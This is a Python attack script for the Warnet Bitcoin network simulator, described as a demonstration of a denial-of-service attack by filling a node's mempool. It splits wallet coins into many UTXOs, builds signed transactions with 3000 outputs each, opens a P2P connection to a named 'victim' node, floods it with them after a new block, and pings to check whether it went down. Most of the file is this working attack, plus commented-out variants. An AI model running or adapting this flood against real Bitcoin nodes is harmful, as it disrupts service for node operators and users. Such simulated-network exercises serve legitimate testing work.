#!/usr/bin/env python3

import socket
import time
from decimal import Decimal

from commander import Commander

from test_framework.messages import (
    msg_tx,
    msg_ping,
    tx_from_hex,
    CTransaction,
    CTxIn,
    COutPoint,
    CTxOut,
    from_hex,
)
from test_framework.script import CScript
from test_framework.p2p import P2PInterface
from test_framework.wallet_util import bytes_to_wif
from test_framework.address import script_to_p2sh, address_to_scriptpubkey
from test_framework.test_framework import BitcoinTestFramework
from test_framework.wallet import MiniWallet
from test_framework.authproxy import JSONRPCException
import threading

class DosFullMempool(Commander):
    def set_test_params(self):
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate DoS attack by filling mempool with valid transactions"
        )
        parser.usage = "warnet run v96_dos_full_mempool.py --debug"
    
    def get_coins(self):
        node = self.nodes[0]
        wallet = node.get_wallet_rpc(node.listwallets()[0])
        #self.log.info(f"{node.getnetworkinfo()}")
        utxos = sorted(wallet.listunspent(), key=lambda x: x['amount'], reverse=True)
        
        coin_base = Decimal("0.042")
        target_num_coins = 700
        current_num_coins = 0
        fee = Decimal("0.00001")
        

        # Wallet armada-0
        #transactions_armada0 = []

        #for utxo in wallet.listunspent():
        #    amount = Decimal(utxo['amount'])
        #    if amount == coin_base:
        #        continue
        #    self.log.info(f"{utxo['txid']}: decompondo moeda...")
            
        #    txid = int(utxo['txid'], 16)
        #    vout = utxo['vout']
        #    ctxin = CTxIn(COutPoint(int(utxo['txid'],16), vout))
            
        #    batch_size = amount // coin_base
        #    if batch_size == 0:
        #        continue
        #    txouts = []
        #    for _ in range(int(batch_size)):
        #        addr = wallet.getnewaddress()
        #        script_pubkey = node.validateaddress(addr)["scriptPubKey"]
        #        txouts.append(CTxOut(int(coin_base * Decimal("1e8")), bytes.fromhex(script_pubkey))) 
            
        #    spent_amount = coin_base * batch_size
        #    change_amount = Decimal(utxo['amount']) - spent_amount - fee

        #    if change_amount > 0:
        #        change_addr = wallet.getnewaddress()
        #        change_script = node.validateaddress(change_addr)["scriptPubKey"]
        #        txouts.append(CTxOut(int(change_amount * Decimal("1e8")), bytes.fromhex(change_script)))
            
        #    tx = CTransaction()
        #    tx.vin = [ctxin]
        #    tx.vout = txouts
        #    raw_tx = tx.serialize().hex()

        #    funded_tx = wallet.fundrawtransaction(raw_tx)
        #    signed_tx = wallet.signrawtransactionwithwallet(funded_tx["hex"])
            
        #    res = node.testmempoolaccept([signed_tx["hex"]])[0]           
        #    current_num_coins += batch_size 
        #    self.log.info("\n                 ==== TRANSACTION INFO ====")
        #    self.log.info(f"# TxID:       {tx.rehash()}")
        #    self.log.info(f"# Inputs:     {Decimal(utxo['amount']):.8f} BTC")
        #    self.log.info(f"# Outputs:    {batch_size*coin_base + change_amount:.8f} BTC")
        #    self.log.info(f"# Fee:        {fee:.8f} BTC")
        #    self.log.info(f"# Size:       {wallet.decoderawtransaction(raw_tx)['size']} bytes")
        #    self.log.info(f"# Nº Outputs: {len(txouts)}")
        #    self.log.info(f"# Accepted:   {res['allowed']}")
        #    if not res["allowed"]:
        #        self.log.info(f"# Rejected reason: {res['reject-reason']}")
        #    self.log.info("==========================\n")

        #    transactions_armada0.append(signed_tx)
        
        
        # Wallet armada-1
        #node1 = self.nodes[1]
        #wallet1 = node1.get_wallet_rpc(node1.listwallets()[0])
        #utxos1 = sorted(wallet1.listunspent(), key=lambda x: x['amount'], reverse=True)

        #transactions_armada1 = []
        #used_utxos1 = []
        #addr_armada0 = wallet.getnewaddress()
        #script_armada0 = bytes.fromhex(node.validateaddress(addr_armada0)['scriptPubKey'])

        #while len(used_utxos1) < len(utxos1):
        #    txins = []
        #    total_input = 0
        #    for utxo in utxos1:
        #        if total_input >= coin_base*batch_size:
        #            break
        #        if utxo in used_utxos1:
        #            continue

        #        txid = int(utxo['txid'], 16)
        #        vout = utxo['vout']
        #        txins.append(CTxIn(COutPoint(int(utxo['txid'],16), vout)))
        #        total_input += Decimal(utxo['amount'])
        #        used_utxos1.append(utxo)

            
        #    new_batch_size = total_input // coin_base
        #    if new_batch_size == 0:
        #        continue
        #    current_num_coins += new_batch_size
            
        #    txouts = []
        #    for _ in range(int(new_batch_size)):
        #        txouts.append(CTxOut(int(coin_base * Decimal("1e8")), script_armada0))
            
        #    spent_amount = coin_base * new_batch_size
        #    change_amount = total_input - spent_amount - fee

        #    if change_amount > 0:
        #        txouts.append(CTxOut(int(change_amount * Decimal("1e8")), script_armada0))

        #    tx = CTransaction()
        #    tx.vin = txins
        #    tx.vout = txouts
        #    raw_tx = tx.serialize().hex()

        #    funded_tx = wallet1.fundrawtransaction(raw_tx)
        #    signed_tx = wallet1.signrawtransactionwithwallet(funded_tx["hex"])

        #    res = node.testmempoolaccept([signed_tx["hex"]])[0]

        #    self.log.info("\n                 ==== TRANSACTION INFO ====")
        #    self.log.info(f"# TxID:       {tx.rehash()}")
        #    self.log.info(f"# Inputs:     {total_input:.8f} BTC")
        #    self.log.info(f"# Outputs:    {new_batch_size*coin_base + change_amount:.8f} BTC")
        #    self.log.info(f"# Fee:        {fee:.8f} BTC")
        #    self.log.info(f"# Size:       {wallet1.decoderawtransaction(raw_tx)['size']} bytes")
        #    self.log.info(f"# Nº Outputs: {len(txouts)}")
        #    self.log.info(f"# Accepted:   {res['allowed']}")
        #    if not res["allowed"]:
        #        self.log.info(f"# Rejected reason: {res['reject-reason']}")
        #    self.log.info("==========================\n")

        #    transactions_armada1.append(signed_tx)

        # Wallet armada-2
        node2 = self.nodes[2]
        wallet2 = node2.get_wallet_rpc(node2.listwallets()[0])
        
        transactions_armada2 = []
        addr_armada0 = wallet.getnewaddress()
        script_armada0 = bytes.fromhex(node.validateaddress(addr_armada0)['scriptPubKey'])

        for utxo in wallet2.listunspent():
            amount = Decimal(utxo['amount'])
            if amount == coin_base:
                continue
            self.log.info(f"{utxo['txid']}: decompondo moeda...")

            txid = int(utxo['txid'], 16)
            vout = utxo['vout']
            ctxin = CTxIn(COutPoint(int(utxo['txid'],16), vout))

            batch_size = amount // coin_base
            if batch_size == 0:
                continue
            
            txouts = []
            for _ in range(int(batch_size)):
                txouts.append(CTxOut(int(coin_base * Decimal("1e8")), script_armada0))

            spent_amount = coin_base * batch_size
            change_amount = amount - spent_amount - fee

            if change_amount > 0:
                txouts.append(CTxOut(int(change_amount * Decimal("1e8")), script_armada0))

            tx = CTransaction()
            tx.vin = [ctxin]
            tx.vout = txouts
            raw_tx = tx.serialize().hex()

            funded_tx = wallet2.fundrawtransaction(raw_tx)
            signed_tx = wallet2.signrawtransactionwithwallet(funded_tx["hex"])

            res = node.testmempoolaccept([signed_tx["hex"]])[0]
            current_num_coins += batch_size
            transactions_armada2.append(signed_tx)

            self.log.info("\n                 ==== TRANSACTION INFO ====")
            self.log.info(f"# TxID:       {tx.rehash()}")
            self.log.info(f"# Inputs:     {amount:.8f} BTC")
            self.log.info(f"# Outputs:    {batch_size*coin_base + change_amount:.8f} BTC")
            self.log.info(f"# Fee:        {fee:.8f} BTC")
            self.log.info(f"# Size:       {wallet2.decoderawtransaction(raw_tx)['size']} bytes")
            self.log.info(f"# Nº Outputs: {len(txouts)}")
            self.log.info(f"# Accepted:   {res['allowed']}")
            if not res["allowed"]:
                self.log.info(f"# Rejected reason: {res['reject-reason']}")
            self.log.info("==========================\n")



        #while len(used_utxos2) < len(utxos2):
        #    txins = []
        #    total_input = 0
        #    for utxo in utxos2:
        #        if total_input >= coin_base*batch_size:
        #            break
        #        if utxo in used_utxos2:
        #            continue

        #        txid = int(utxo['txid'], 16)
        #        vout = utxo['vout']
        #        txins.append(CTxIn(COutPoint(int(utxo['txid'],16), vout)))
        #        total_input += Decimal(utxo['amount'])
        #        used_utxos2.append(utxo)


        #    new_batch_size = total_input // coin_base
        #    if new_batch_size == 0:
        #        continue
        #    current_num_coins += new_batch_size

        #    txouts = []
        #    for _ in range(int(new_batch_size)):
        #        txouts.append(CTxOut(int(coin_base * Decimal("1e8")), script_armada0))

        #    spent_amount = coin_base * new_batch_size
        #    change_amount = total_input - spent_amount - fee

        #    if change_amount > 0:
        #        txouts.append(CTxOut(int(change_amount * Decimal("1e8")), script_armada0))

        #    tx = CTransaction()
        #    tx.vin = txins
        #    tx.vout = txouts
        #    raw_tx = tx.serialize().hex()

        #    funded_tx = wallet2.fundrawtransaction(raw_tx)
        #    signed_tx = wallet2.signrawtransactionwithwallet(funded_tx["hex"])

        #    res = node.testmempoolaccept([signed_tx["hex"]])[0]

        #    self.log.info("\n                 ==== TRANSACTION INFO ====")
        #    self.log.info(f"# TxID:       {tx.rehash()}")
        #    self.log.info(f"# Inputs:     {total_input:.8f} BTC")
        #    self.log.info(f"# Outputs:    {new_batch_size*coin_base + change_amount:.8f} BTC")
        #    self.log.info(f"# Fee:        {fee:.8f} BTC")
        #    self.log.info(f"# Size:       {wallet2.decoderawtransaction(raw_tx)['size']} bytes")
        #    self.log.info(f"# Nº Outputs: {len(txouts)}")
        #    self.log.info(f"# Accepted:   {res['allowed']}")
        #    if not res["allowed"]:
        #        self.log.info(f"# Rejected reason: {res['reject-reason']}")
        #    self.log.info("==========================\n")

        #    transactions_armada2.append(signed_tx)

        self.log.info(f"Total de moedas geradas = {current_num_coins}")
        
        for tx in transactions_armada2:
            res = node.testmempoolaccept([tx["hex"]])[0]
            self.log.info(f"{tx} -> {res['allowed']}")
            try:
                txid = node.sendrawtransaction(tx["hex"])
                self.log.info(f"{txid} enviada com sucesso!")
            except Exception as e:
                self.log.info(f"Não foi possível enviar a transação: {e}")

            time.sleep(0.2)
        #return transactions_armada0 + transactions_armada1 + transactions_armada2
    


    # Scenario entrypoint
    def run_test(self):
        node = self.nodes[0]
        wallet = node.get_wallet_rpc(node.listwallets()[0])
        #self.log.info(f"{node.getnetworkinfo()}")
        #utxos = sorted(wallet.listunspent(), key=lambda x: x['amount'], reverse=True)
       
        #self.log.info(f"Nº modedas = {len(wallet.listunspent())}")
        #return

        base_coin_value = Decimal('0.042')
        fee = Decimal('0.00001')
        transactions = []
        total_size = 0
        count = 1
        for utxo in wallet.listunspent():
            #self.log.info(f"Coin {count} criada!")
            amount = Decimal(utxo['amount'])
            if amount != base_coin_value:
                continue

            txid = int(utxo['txid'], 16)
            vout = utxo['vout']
            ctxin = CTxIn(COutPoint(int(utxo['txid'],16), vout))
            
            num_outputs = 3000
            amount_per_output = (amount / num_outputs) * Decimal('0.99')

            txouts = []
            for _ in range(int(num_outputs)):
                addr = wallet.getnewaddress()
                script_pubkey = node.validateaddress(addr)["scriptPubKey"]
                txouts.append(CTxOut(int(amount_per_output * Decimal("1e8")), bytes.fromhex(script_pubkey)))
        
            spent_amount = amount_per_output * num_outputs
            change_amount = amount - spent_amount - fee
            if change_amount > 0:
                change_addr = wallet.getnewaddress()
                change_script = node.validateaddress(change_addr)["scriptPubKey"]
                txouts.append(CTxOut(int(change_amount * Decimal("1e8")), bytes.fromhex(change_script)))

            #self.log.info(f"input = {amount}, output = {amount_per_output*num_outputs+change_amount}, fee = {amount - amount_per_output*num_outputs -change_amount}")

            tx = CTransaction()
            tx.vin = [ctxin]
            tx.vout = txouts
            raw_tx = tx.serialize().hex()

            funded_tx = wallet.fundrawtransaction(raw_tx)
            signed_tx = wallet.signrawtransactionwithwallet(funded_tx['hex'])

            res = node.testmempoolaccept([signed_tx["hex"]])[0]

            decoded = wallet.decoderawtransaction(raw_tx)
            self.log.info(f"Coin {count}: {'Accepted!' if res['allowed'] else 'Rejected!'}")
            
            count += 1
            total_size += decoded['size']
            transactions.append(signed_tx)

        self.log.info(f"Nº de transações: {len(transactions)}")
        self.log.info(f"Total de bytes: {total_size}")
        self.log.info(f"Iniciando transmissão das transações...")
        
        victim = "tank-0114-sapphire.default.svc"
        dstaddr = socket.gethostbyname(victim)
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        prev_height = node.getblockcount()
        self.log.info(f"Bloco atual = {prev_height}")
        while True:
            h = node.getblockcount()
            if h != prev_height:
                print(f"Novo bloco na altura {h}")
                prev_height = h
                break
            time.sleep(0.2)

        for tx in transactions:
            transaction = from_hex(CTransaction(), tx['hex'])
            try:
                attacker.send_message(msg_tx(transaction))
            except Exception as e:
                self.log.info(f"Não foi possível enviar a transação: {e}")
        
        self.log.info(f"Trying to ping {victim}...")
        self.log.info(f"Ping count: {attacker.ping_counter}")
        try:
            ping = msg_ping()

            while attacker.ping_counter < 5:
                time.sleep(3)
                self.log.info(f"Ping: {attacker.ping_counter}")
                attacker.send_message(ping)
            self.log.info("The attack ended unsuccessfully!")

        except:
            self.log.info(f"It was not possible to communicate with {victim}!")
            self.log.info(f"Ping count: {attacker.ping_counter}")
            self.log.info(f"Attack successfully completed!")

            #try:
            #    txid = node.sendrawtransaction(signed_tx["hex"])
            #    self.log.info(f"{txid} enviada com sucesso!")
            #except Exception as e:
            #    self.log.info(f"Não foi possível enviar a transação: {e}")


        #total = 0
        #plano = 0
        #for utxo in utxos:
        #    self.log.info(f"{utxo['txid']}: {utxo['amount']}")
        #    total += Decimal(utxo['amount'])
        #    if Decimal(utxo['amount']) == Decimal('0.042'):
        #        plano += 1

        #self.log.info(f"total BTC = {total}")
        #self.log.info(f"Total = {len(utxos)}")
        #self.log.info(f"PPlano = {plano}")
         
        #txins = []
        #total_input = 0
        #num_inputs = 0
        #for utxo in utxos:
        #    amount = Decimal(utxo['amount'])
        #    if num_inputs >= 1000:
        #        break
        #    if amount == Decimal('0.042'):
        #        continue
            
        #    txid = int(utxo['txid'], 16)
        #    vout = utxo['vout']
        #    txins.append(CTxIn(COutPoint(int(utxo['txid'],16), vout)))
        #    total_input += Decimal(utxo['amount'])
        #    num_inputs += 1 


        #outputs_num = 2993
        #amount_per_output = (total_input / outputs_num) * Decimal("0.99")
        
        #txouts = []
        #for _ in range(int(outputs_num)):
        #    addr = wallet.getnewaddress()
        #    script_pubkey = node.validateaddress(addr)["scriptPubKey"]    
        #    txouts.append(CTxOut(int(amount_per_output * Decimal("1e8")), bytes.fromhex(script_pubkey)))

        #spent_amount = amount_per_output * outputs_num

        #fee = Decimal("0.00001")
        #change_amount = total_input - spent_amount - fee

        #if change_amount > 0:
        #    change_addr = wallet.getnewaddress()
        #    change_script = node.validateaddress(change_addr)["scriptPubKey"]
        #    txouts.append(CTxOut(int(change_amount * Decimal("1e8")), bytes.fromhex(change_script)))

        #self.log.info(f"input = {total_input}, output = {amount_per_output*outputs_num+change_amount}, fee = {total_input - amount_per_output*outputs_num-change_amount}")

        #tx = CTransaction()
        #tx.vin = txins
        #tx.vout = txouts
        #raw_tx = tx.serialize().hex()

        #funded_tx = wallet.fundrawtransaction(raw_tx)
        #signed_tx = wallet.signrawtransactionwithwallet(funded_tx["hex"])

        #res = node.testmempoolaccept([signed_tx["hex"]])[0]
        #self.log.info(f"Aceita no mempool? {res['allowed']}")
        #if not res["allowed"]:
        #    self.log.info(f"Motivo da rejeição: {res['reject-reason']}")

        #decoded = wallet.decoderawtransaction(raw_tx)
        #self.log.info(f"VSize = {decoded['vsize']}, Size = {decoded['size']}")

        #try:
        #    txid = node.sendrawtransaction(signed_tx["hex"])
        #    self.log.info(f"{txid} enviada com sucesso!")
        #except Exception as e:
        #    self.log.info(f"Não foi possível enviar a transação: {e}")
        


def main():
    DosFullMempool().main()


if __name__ == "__main__":
    main()
